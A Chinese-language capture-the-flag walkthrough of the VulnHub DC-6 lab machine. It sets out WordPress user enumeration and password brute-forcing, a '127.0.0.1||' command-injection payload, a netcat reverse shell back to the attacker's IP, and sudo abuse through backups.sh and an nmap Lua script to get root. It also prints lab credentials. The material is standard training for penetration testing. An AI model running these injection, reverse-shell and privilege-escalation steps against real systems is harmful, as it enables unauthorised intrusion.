# 靶机地址

[DC: 6 ~ VulnHub](https://www.vulnhub.com/entry/dc-6,315/)

![img](./assets/wps886.jpg) 

 

 

# 题目提示

![img](./assets/wps887.jpg) 

 

 

 

# 信息收集

 

## 主机探活

```
arp-sacn -l --interface=eth0
```

![img](./assets/wps888.jpg) 

确定目标ip地址

192.168.6.30

 

 

## 扫描目标主机开放端口

```
nmap -sS -Pn -p- -sV 192.168.6.30
```

![img](./assets/wps889.jpg) 

 

目标主机开放了

22/tcp  ssh

80/tcp  http  

 

 

访问192.168.6.30

![img](./assets/wps890.jpg) 

 

 

 

nmap加入-A参数扫描目标主机80端口

```
nmap -p80 -A 192.168.6.30
```

![img](./assets/wps891.jpg) 

 

 

重定向到 http://wordy/

 

添加本机hosts解析：

kali:

mousepad /etc/hosts

![img](./assets/wps892.jpg) 

 

 

windows：

![img](./assets/wps893.jpg) 

 

 

重新访问，成功

![img](./assets/wps894.jpg) 

 

 

CMS：wordPress

 

 

 

## dirsearch 扫描目录

```
dirsearch -u 192.168.6.30
```

![img](./assets/wps895.jpg) 

 

![img](./assets/wps896.jpg) 

 

 

 

爆破出来登录页面，无敏感信息

访问登录页面

![img](./assets/wps897.jpg) 

 

 

 

 

## 使用wpscan爆破出用户名信息

```
wpscan --url http://wordy/ -e u
```

![img](./assets/wps898.jpg) 

 

![img](./assets/wps899.jpg) 

 

共找到五个用户

admin

jens

graham

mark

sarah

 

 

根据题目提示

![img](./assets/wps900.jpg) 

 

 

使用/usr/share/wordlists/rockyou.txt爆破

rockyou初始为压缩包，记得解压后使用

 

首先创建一个users字典

写入爆破出的用户名

![img](./assets/wps901.jpg) 

 

 

将rockyou.txt保存到桌面方便使用

cp /usr/share/wordlists/rockyou.txt rockyou.txt

![img](./assets/wps902.jpg) 

 

 

 

## 然后使用wpscan进行爆破

```
wpscan --url http://wordy/ -U users.txt -P rockyou.txt
```

![img](./assets/wps903.jpg) 



```
mark/helpdesk01
```

成功登录后台

 

![img](./assets/wps904.jpg) 

 

 

在Activity monitor--Tools页面下存在一个工具

将ip转为十进制，可能存在rce

![img](./assets/wps905.jpg) 

 

![img](./assets/wps906.jpg) 

 

 

 

尝试执行

```
127.0.0.1||whoami
```

时发现存在长度限制

（可以尝试修改html源码，也可以选择bp抓包修改）

 

![img](./assets/wps907.jpg) 

 

bp抓包

![img](./assets/wps908.jpg) 

修改命令后放包

 

 

 

最终发现，convert无法利用，lookup可利用

执行

```
whoami
```

convert

![img](./assets/wps909.jpg) 

 

 

 

lookup

![img](./assets/wps910.jpg) 

 

 

 

 

尝试反弹shell

执行

```
127.0.0.1||which nc
```

确定目标主机是否有nc

 

![img](./assets/wps911.jpg) 

 

得到回显

 

## 利用nc反弹shell

本地：

```
nc -lvvp 8989
```

![img](./assets/wps912.jpg) 

 

 

目标主机：

```
127.0.0.1||nc -e /bin/bash 192.168.6.5 8989
```

 

## 成功反弹shell

![img](./assets/wps913.jpg) 

 

 

 

## python转换终端

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![img](./assets/wps914.jpg) 

 

 

 

 

suid提权

查找可利用文件

```
find / -perm -u=st -type f 2>/dev/null
```

![img](./assets/wps915.jpg) 

 

无发现

 

 

sudo -l查找可执行sudo

![img](./assets/wps916.jpg) 

 

 

需要密码

进入home文件夹

 

共四个用户，进入mark目录下，发现有一个things-to-do.txt

![img](./assets/wps917.jpg) 

 

![img](./assets/wps918.jpg) 

 

得到graham的密码

GSo7isUM1D4

成功切换为graham用户

![img](./assets/wps919.jpg) 

 

再次执行sudo -l

![img](./assets/wps920.jpg) 

 

 

发现gramham可以在不需要密码的情况下执行/home/jens/backups.sh

 

查看该脚本内容

 

![img](./assets/wps921.jpg) 

 

是对web进行打包

 

往backups.sh中写入"/bin/bash"（给jens获取一个shell权限）

```
echo "/bin/bash" >> backups.sh
```

![img](./assets/wps922.jpg) 

 

 

 

以jens身份执行该文件

```
sudo -u jens ./backups.sh
```

![img](./assets/wps923.jpg) 

 

再次执行sudo -l

发现jens可以在无密码的情况下执行nmap

![img](./assets/wps924.jpg) 

 

 

写入一个getshell脚本，并让nmap运行

```
echo 'os.execute("/bin/bash")' >> getshell
```

 

![img](./assets/wps925.jpg) 

 

 

```
sudo nmap --script=getshell
```

![img](./assets/wps926.jpg) 

 

 

成功取得root权限

取得flag

![img](./assets/wps927.jpg) 

 

 

 